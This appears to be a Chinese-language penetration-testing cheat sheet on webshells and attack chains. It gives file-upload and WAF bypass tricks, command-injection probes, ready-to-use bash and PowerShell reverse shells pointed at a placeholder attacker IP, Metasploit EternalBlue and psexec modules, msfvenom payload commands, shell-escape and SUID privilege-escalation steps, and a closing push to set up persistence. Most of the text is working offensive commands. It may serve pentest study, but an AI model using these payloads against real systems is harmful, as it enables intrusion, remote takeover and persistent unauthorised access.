# Webshel​​l

## 🔍 **1. 發現點 (漏洞發現)**

\
✅ **未受限制的文件上傳 (Unrestricted File Upload)** → 可能導致遠端代碼執行 (RCE)\
✅ **命令注入 (Command Injection)** → 可能允許直接執行系統命令

***

🚀 **2. 測試 Payload (有效載荷測試)**\
📌 **文件上傳測試**
-------------

* 使用 **WebShell** (`.php`, `.aspx`, `.jsp`) 測試是否可以執行
* 嘗試 **繞過過濾機制** (MIME 類型過濾、文件擴展名黑名單、雙重擴展名 `.jpg.php`)
* 使用 [**revshells.com**](https://www.revshells.com/) 生成反向 Shell (Reverse Shell)

📌 **命令注入測試**

*   嘗試基本命令執行：

    ```bash
    whoami && uname -a
    ```

    ```cmd
    ipconfig && net user
    ```
* 測試常見繞過技巧 (`;`, `&&`, `||`, `|`, `$()`, `` ` ` ``)
* 嘗試 **Base64 / URL 編碼** 避開 WAF

***

## 🛠️ **3. 繞過技巧 (Bypass 技巧)**

\
✅ **使用 URL 編碼繞過 WAF**\
✅ **使用雙重擴展名 (`.jpg.php`, `.asp;.txt`) 上傳 WebShell**\
✅ **利用 HTTP 參數污染 (HTTP Parameter Pollution, HPP) 進行繞過**\
✅ **修改 `Content-Type` 為 `image/jpeg` 以繞過 MIME 過濾**\
✅ **嘗試 NTFS ADS (`file.asp::$DATA`) 在 Windows 伺服器上繞過檢測**

更多技巧可參考：[revshells.com](https://www.revshells.com/)

***

🎯 **4. 進一步測試 (深度利用)**\
🔹 **權限提升 (Privilege Escalation)**

* `sudo -l` → 查看當前用戶可以執行的 `sudo` 命令 (Linux)
* `whoami /priv` → 檢查 Windows 權限，查看是否有 `SeImpersonatePrivilege` (可用於 `Juicy Potato` 提權)

🔹 **反向 Shell 測試 (Reverse Shell Execution)**

*   **Linux Netcat 反向 Shell**

    ```bash
    bash -i >& /dev/tcp/攻擊者IP/攻擊者端口 0>&1
    ```
*   **Windows PowerShell 反向 Shell**

    ```powershell
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('攻擊者IP', 攻擊者端口);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```

***

🔗 **5. 連鎖漏洞 (漏洞鏈接)**\
✅ **未受限制的文件上傳 (Unrestricted File Upload) → 上傳 WebShell (`cmd.aspx`)**\
✅ **命令注入 (Command Injection) → 直接 RCE (`ping 攻擊者IP`)**\
✅ **IIS 短檔名枚舉 (IIS Tilde Enumeration) → 洩露隱藏的 `.aspx` 文件**\
✅ **爆破完整檔名** (`.config`, `.asp`, `.txt`) → 找到敏感文件 (`admin_login.aspx`)\
✅ **SQL 注入 (SQLi) 測試 (`sqlmap -u "http://目標/admin_login.aspx?id=1"`)**\
✅ **進一步利用 RCE / 權限提升 (Privilege Escalation) 取得系統控制權**

***

## 🔥 **6. 常用命令與濫用技巧**

### 📌 **遠程桌面攻擊 (RDP Exploitation)**

```bash
xfreerdp /v:<目標IP> /u:<用戶名> /p:<密碼>
```

* 使用 RDP 連接 Windows 目標，可能進一步控制系統

### 📌 **Netcat 監聽與連接 (Netcat Listener & Connection)**

```bash
sudo nc -lvnp <PORT>
```

* 啟動 Netcat 監聽器，等待反向 Shell

```bash
nc -nv <攻擊者IP> <PORT>
```

* 手動連接目標機器的 Netcat Shell

### 📌 **Metasploit 漏洞利用**

```bash
use exploit/windows/smb/psexec
```

* 使用 `psexec` 針對 Windows SMB 進行遠端攻擊

```bash
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_psexec
```

* MS17-010 (永恆之藍漏洞) 攻擊，利用 SMB 取得 Shell

### 📌 **MSFVenom 生成 Payload**

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<攻擊者IP> LPORT=<PORT> -f elf > shell.elf
```

* 生成 Linux 反向 Shell Payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<攻擊者IP> LPORT=<PORT> -f exe > shell.exe
```

* 生成 Windows 反向 Shell Payload

### 📌 **WebShell 位置**

```bash
/usr/share/webshells/laudanum
/usr/share/nishang/Antak-WebShell
```

* `Laudanum` 和 `Nishang` WebShell 可用於滲透測試

***

### 🎯 **7. 權限提升與逃逸** 📌 **獲取互動式 Shell**

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

* 讓 Shell 變成交互式，可使用 `clear`, `nano` 等指令

### 📌 **VIM 逃逸 Shell**

```bash
vim -c ':!/bin/sh'
```

* 在受限制的環境 (`jail shell`) 中逃逸獲取完整 Shell

### 📌 **檢查 Sudo 權限**

```bash
sudo -l
```

* 檢查當前用戶是否可以執行 `sudo` 命令

### 📌 **查找 SUID 二進制文件**

```bash
find / -perm -4000 -type f 2>/dev/null
```

* 查找 SUID 權限的可執行文件，可能可用於提權

***

✅ **8. 下一步建議 (進一步攻擊)**\
📌 測試 **IIS 短檔名枚舉** (`IIS Short Name Scanner`)\
📌 嘗試 **SQL 注入 (`sqlmap`) 或 XSS 測試**\
📌 **獲取反向 Shell** → 提升權限 (`Privilege Escalation`)\
📌 **建立後門 / 保持存取權限** (`Persistence`)

這樣能夠將攻擊鏈條最大化，進一步滲透！💀🚀
